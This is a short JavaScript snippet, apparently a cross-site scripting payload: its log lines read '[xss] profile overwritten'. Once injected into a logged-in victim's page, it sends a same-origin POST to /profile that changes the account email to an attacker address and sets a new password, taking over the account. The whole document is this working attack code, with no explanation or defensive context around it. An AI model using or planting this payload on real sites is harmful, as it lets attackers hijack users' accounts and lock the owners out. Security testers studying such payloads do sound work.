
(function () {
  var body = new URLSearchParams({
    email: "attacker@evil.test",
    password: "xss-test"
  }).toString();

  fetch("/profile", {
    method: "POST",
    headers: { "Content-Type": "application/x-www-form-urlencoded" },
    body: body,
    credentials: "same-origin"
  })
    .then(function () { console.log("[xss] profile overwritten"); })
    .catch(function (e) { console.log("[xss] failed", e); });
})();
